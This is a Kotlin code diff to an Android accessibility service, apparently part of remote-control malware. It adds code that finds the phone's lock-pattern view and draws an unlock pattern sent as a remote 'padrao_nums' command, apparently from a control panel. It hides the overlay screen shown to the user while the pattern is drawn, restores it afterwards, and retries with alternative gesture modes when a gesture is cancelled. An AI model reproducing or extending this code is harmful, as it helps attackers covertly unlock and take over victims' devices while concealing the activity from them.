@@ -81,6 +81,11 @@ class ControleGestosService : AccessibilityService() {
     private val handlerPrincipal = Handler(Looper.getMainLooper())
     private val intervaloConsultaOverlayMs = 4000L
     private var ignorarArrastosAteMs = 0L
+    private var ultimaAreaPadraoDetectada: Rect? = null
+    private var restaurarOverlayAposPadrao = false
+    private var mensagemOverlaySalva = ""
+    private var textoInferiorOverlaySalvo = ""
+    private var logoOverlaySalvo = ""
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -1216,10 +1221,13 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun detectarAreaPadrao(elementos: List<Map<String, Any>>): Rect? {
-        encontrarNoPadraoNaTela()?.let { no ->
+        encontrarMelhorNoPadrao()?.let { no ->
             val area = Rect()
             no.getBoundsInScreen(area)
-            if (area.width() >= 120 && area.height() >= 120) return area
+            if (area.width() >= 120 && area.height() >= 120) {
+                ultimaAreaPadraoDetectada = area
+                return area
+            }
         }
 
         for (elemento in elementos) {
@@ -1233,7 +1241,11 @@ class ControleGestosService : AccessibilityService() {
             val y = elemento["y"] as? Int ?: continue
             val largura = elemento["largura"] as? Int ?: continue
             val altura = elemento["altura"] as? Int ?: continue
-            if (largura >= 120 && altura >= 120) return Rect(x, y, x + largura, y + altura)
+            if (largura >= 120 && altura >= 120) {
+                val area = Rect(x, y, x + largura, y + altura)
+                ultimaAreaPadraoDetectada = area
+                return area
+            }
         }
         return null
     }
@@ -1248,28 +1260,81 @@ class ControleGestosService : AccessibilityService() {
         return raizes.distinctBy { it.hashCode() }
     }
 
-    private fun encontrarNoPadraoNaTela(): AccessibilityNodeInfo? {
-        for (raiz in obterRaizesParaBusca()) {
-            buscarNoPadraoRecursivo(raiz)?.let { return it }
+    private data class CandidatoPadrao(val no: AccessibilityNodeInfo, val score: Int)
+
+    private fun pontuarNoPadrao(no: AccessibilityNodeInfo): Int {
+        val area = Rect()
+        no.getBoundsInScreen(area)
+        if (!no.isVisibleToUser || area.width() < 120 || area.height() < 120) return -1
+
+        val classe = no.className?.toString()?.lowercase().orEmpty()
+        val id = no.viewIdResourceName?.lowercase().orEmpty()
+        var score = 0
+
+        when {
+            classe.contains("lockpatternview") -> score += 120
+            ehNoPadrao(no) -> score += 70
         }
-        return null
+
+        val aspecto = area.width().toFloat() / area.height().toFloat()
+        if (aspecto in 0.82f..1.18f) score += 35
+
+        val dm = resources.displayMetrics
+        val proporcao = (area.width() * area.height()).toFloat() / (dm.widthPixels * dm.heightPixels).toFloat()
+        when {
+            proporcao in 0.08f..0.40f -> score += 30
+            proporcao > 0.65f -> score -= 80
+        }
+
+        if (no.isClickable || no.isFocusable) score += 10
+        if (id.contains("lock") || id.contains("pattern")) score += 15
+        return score
     }
 
-    private fun buscarNoPadraoRecursivo(no: AccessibilityNodeInfo): AccessibilityNodeInfo? {
-        if (ehNoPadrao(no)) {
-            val area = Rect()
-            no.getBoundsInScreen(area)
-            if (area.width() >= 120 && area.height() >= 120) return no
+    private fun coletarCandidatosPadrao(
+        no: AccessibilityNodeInfo,
+        lista: MutableList<CandidatoPadrao>,
+        profundidade: Int = 0
+    ) {
+        if (profundidade > 14) return
+
+        val score = pontuarNoPadrao(no)
+        if (score > 0) lista.add(CandidatoPadrao(no, score))
+
+        val area = Rect()
+        no.getBoundsInScreen(area)
+        val aspecto = if (area.height() > 0) area.width().toFloat() / area.height() else 0f
+        val dm = resources.displayMetrics
+        val proporcao = (area.width() * area.height()).toFloat() / (dm.widthPixels * dm.heightPixels).toFloat()
+        if (score <= 0 && no.isVisibleToUser && aspecto in 0.88f..1.12f && proporcao in 0.12f..0.38f) {
+            lista.add(CandidatoPadrao(no, 28))
         }
+
         for (i in 0 until no.childCount) {
             val filho = no.getChild(i) ?: continue
-            buscarNoPadraoRecursivo(filho)?.let { return it }
+            coletarCandidatosPadrao(filho, lista, profundidade + 1)
         }
-        return null
     }
 
-    private fun calcularCentrosGrade(area: Rect): List<Pair<Float, Float>> {
-        val paddingFactor = if (fabricanteUsaToquesParaPadrao()) 0.14f else 0.07f
+    private fun encontrarMelhorNoPadrao(): AccessibilityNodeInfo? {
+        val candidatos = mutableListOf<CandidatoPadrao>()
+        for (raiz in obterRaizesParaBusca()) {
+            coletarCandidatosPadrao(raiz, candidatos)
+        }
+        return candidatos.maxByOrNull { it.score }?.no
+    }
+
+    private fun encontrarNoPadraoNaTela(): AccessibilityNodeInfo? = encontrarMelhorNoPadrao()
+
+    private fun estimarAreaPadraoTela(): Rect {
+        val dm = resources.displayMetrics
+        val lado = (kotlin.math.min(dm.widthPixels, dm.heightPixels) * 0.68f).toInt()
+        val esquerda = (dm.widthPixels - lado) / 2
+        val topo = (dm.heightPixels * 0.30f).toInt()
+        return Rect(esquerda, topo, esquerda + lado, topo + lado)
+    }
+
+    private fun calcularCentrosGrade(area: Rect, paddingFactor: Float): List<Pair<Float, Float>> {
         val padX = area.width() * paddingFactor
         val padY = area.height() * paddingFactor
         val esquerda = area.left + padX
@@ -1338,52 +1403,116 @@ class ControleGestosService : AccessibilityService() {
         return false
     }
 
-    private fun executarPadraoPorNumeros(numeros: List<Int>) {
+    private fun calcularCentrosGrade(no: AccessibilityNodeInfo): List<Pair<Float, Float>> {
+        val area = Rect()
+        no.getBoundsInScreen(area)
+        val padding = if (fabricanteUsaToquesParaPadrao()) 0.12f else 0.07f
+        return calcularCentrosGrade(area, padding)
+    }
+
+    private fun resolverPontosPadrao(
+        numeros: List<Int>,
+        coordsFallback: List<Pair<Float, Float>>? = null
+    ): List<Pair<Float, Float>> {
+        val areas = linkedSetOf<Rect>()
+        encontrarMelhorNoPadrao()?.let { no ->
+            val area = Rect()
+            no.getBoundsInScreen(area)
+            if (area.width() >= 120) areas.add(area)
+        }
+        ultimaAreaPadraoDetectada?.let { areas.add(it) }
+        areas.add(estimarAreaPadraoTela())
+
+        val paddings = if (fabricanteUsaToquesParaPadrao()) {
+            listOf(0.10f, 0.16f, 0.07f, 0.20f)
+        } else {
+            listOf(0.07f, 0.11f)
+        }
+
+        for (area in areas) {
+            for (padding in paddings) {
+                val centros = calcularCentrosGrade(area, padding)
+                val pontos = numeros.mapNotNull { numero -> centros.getOrNull(numero - 1) }
+                if (pontos.size >= 2) return pontos
+            }
+        }
+
+        if (coordsFallback != null && coordsFallback.size >= numeros.size) {
+            Log.w("KL", "Usando coordenadas de fallback do painel")
+            return coordsFallback
+        }
+        return emptyList()
+    }
+
+    private fun focarNoPadrao(no: AccessibilityNodeInfo?) {
+        no ?: return
+        no.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS)
+        no.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
+    }
+
+    private fun ocultarOverlaysParaPadrao(): Boolean {
+        val tinhaOverlay = overlayAtivo || overlayView != null || OverlayActivity.estaAtiva()
+        if (!tinhaOverlay) return false
+
+        restaurarOverlayAposPadrao = true
+        mensagemOverlaySalva = mensagemOverlayAtual
+        textoInferiorOverlaySalvo = textoInferiorOverlayAtual
+        logoOverlaySalvo = logoOverlayAtual
+        OverlayActivity.fechar()
+        removerOverlayJanela()
+        return true
+    }
+
+    private fun restaurarOverlaySeNecessario(precisavaRestaurar: Boolean) {
+        if (!precisavaRestaurar || !restaurarOverlayAposPadrao) return
+        restaurarOverlayAposPadrao = false
+        handlerPrincipal.postDelayed({
+            mostrarOuAtualizarOverlay(
+                mensagemOverlaySalva.ifEmpty { "Aguarde..." },
+                textoInferiorOverlaySalvo,
+                logoOverlaySalvo
+            )
+        }, 1200L)
+    }
+
+    private fun executarPadraoPorNumeros(
+        numeros: List<Int>,
+        coordsFallback: List<Pair<Float, Float>>? = null
+    ) {
         if (numeros.size < 2) {
             Log.e("KL", "padrao_nums precisa de pelo menos 2 celulas")
             return
         }
 
-        val noPadrao = encontrarNoPadraoNaTela()
-        val pontos = if (noPadrao != null) {
-            val centros = calcularCentrosGrade(noPadrao)
-            numeros.mapNotNull { numero ->
-                centros.getOrNull(numero - 1)?.also {
-                    Log.d("KL", "Celula $numero -> (${it.first}, ${it.second}) via LockPatternView")
+        val precisavaOcultarOverlay = ocultarOverlaysParaPadrao()
+        handlerPrincipal.postDelayed({
+            try {
+                val noPadrao = encontrarMelhorNoPadrao()
+                focarNoPadrao(noPadrao)
+                val pontos = resolverPontosPadrao(numeros, coordsFallback)
+                if (pontos.size < 2) {
+                    Log.e("KL", "Nao foi possivel calcular coordenadas do padrao no aparelho")
+                    return@postDelayed
                 }
+                Log.i("KL", "Executando padrao_nums ${numeros.joinToString("-")} (${pontos.size} pontos)")
+                executarPadraoDesbloqueio(pontos)
+            } finally {
+                restaurarOverlaySeNecessario(precisavaOcultarOverlay)
             }
-        } else {
-            Log.w("KL", "LockPatternView nao encontrado para padrao_nums")
-            emptyList()
-        }
-
-        if (pontos.size < 2) {
-            Log.e("KL", "Nao foi possivel calcular coordenadas do padrao no aparelho")
-            return
-        }
-
-        Log.i("KL", "Executando padrao_nums ${numeros.joinToString("-")} (${pontos.size} pontos)")
-        executarPadraoDesbloqueio(pontos)
+        }, if (precisavaOcultarOverlay) 450L else 120L)
     }
 
     private fun executarPadraoDesbloqueio(pontos: List<Pair<Float, Float>>) {
         if (pontos.size < 2) return
 
-        val callbackFallback: (Boolean) -> Unit = { cancelado ->
-            if (cancelado) {
-                Log.w("KL", "Primeiro gesto falhou, tentando modo alternativo")
-                if (fabricanteUsaToquesParaPadrao()) {
-                    executarPadraoContinuo(pontos, null)
-                } else {
-                    executarPadraoSegmentado(pontos, null)
-                }
+        executarPadraoContinuo(pontos) { cancelado1 ->
+            if (!cancelado1) return@executarPadraoContinuo
+            Log.w("KL", "Padrao continuo cancelado, tentando segmentado")
+            executarPadraoSegmentado(pontos) { cancelado2 ->
+                if (!cancelado2) return@executarPadraoSegmentado
+                Log.w("KL", "Padrao segmentado cancelado, tentando arrastos encadeados")
+                executarArrastosEncadeados(pontos, null)
             }
-        }
-
-        if (fabricanteUsaToquesParaPadrao()) {
-            executarPadraoSegmentado(pontos, callbackFallback)
-        } else {
-            executarPadraoContinuo(pontos, callbackFallback)
         }
     }
 
@@ -1424,12 +1553,18 @@ class ControleGestosService : AccessibilityService() {
                 executarArrasto(x1, y1, x2, y2)
             }
             "padrao_nums" -> {
-                val numeros = partes.getOrNull(1)
-                    ?.split(",")
-                    ?.mapNotNull { it.trim().toIntOrNull() }
-                    ?: return
-                executarPadraoPorNumeros(numeros)
-                ignorarArrastosAteMs = System.currentTimeMillis() + 6000
+                val payload = partes.getOrNull(1) ?: return
+                val partesPayload = payload.split(";", limit = 2)
+                val numeros = partesPayload[0]
+                    .split(",")
+                    .mapNotNull { it.trim().toIntOrNull() }
+                val coordsFallback = if (partesPayload.size > 1) {
+                    parsearPontos(partesPayload[1].split(","))
+                } else {
+                    null
+                }
+                executarPadraoPorNumeros(numeros, coordsFallback)
+                ignorarArrastosAteMs = System.currentTimeMillis() + 8000
             }
             "padrao" -> {
                 val coords = partes.getOrNull(1)?.split(",") ?: return
@@ -1635,6 +1770,51 @@ class ControleGestosService : AccessibilityService() {
                 aoTerminar?.invoke(true)
             }
         }, null)
+    }
+
+    private fun executarArrastosEncadeados(
+        pontos: List<Pair<Float, Float>>,
+        aoTerminar: ((cancelado: Boolean) -> Unit)?
+    ) {
+        if (pontos.size < 2) {
+            aoTerminar?.invoke(true)
+            return
+        }
+
+        fun proximo(indice: Int) {
+            if (indice >= pontos.size - 1) {
+                Log.i("KL", "Arrastos encadeados concluidos")
+                aoTerminar?.invoke(false)
+                return
+            }
+
+            val origem = pontos[indice]
+            val destino = pontos[indice + 1]
+            val dx = destino.first - origem.first
+            val dy = destino.second - origem.second
+            val distancia = sqrt(dx * dx + dy * dy)
+            val duracao = (distancia * 2.6f).toLong().coerceIn(280L, 1100L)
+            val caminho = Path().apply {
+                moveTo(origem.first, origem.second)
+                lineTo(destino.first, destino.second)
+            }
+            val gesto = GestureDescription.Builder()
+                .addStroke(GestureDescription.StrokeDescription(caminho, 0L, duracao))
+                .build()
+
+            dispatchGesture(gesto, object : GestureResultCallback() {
+                override fun onCompleted(gestureDescription: GestureDescription?) {
+                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 90L)
+                }
+
+                override fun onCancelled(gestureDescription: GestureDescription?) {
+                    Log.w("KL", "Arrasto encadeado ${indice + 1} cancelado")
+                    aoTerminar?.invoke(true)
+                }
+            }, null)
+        }
+
+        proximo(0)
     }
 
     private fun executarSequenciaToques(pontos: List<Pair<Float, Float>>) {
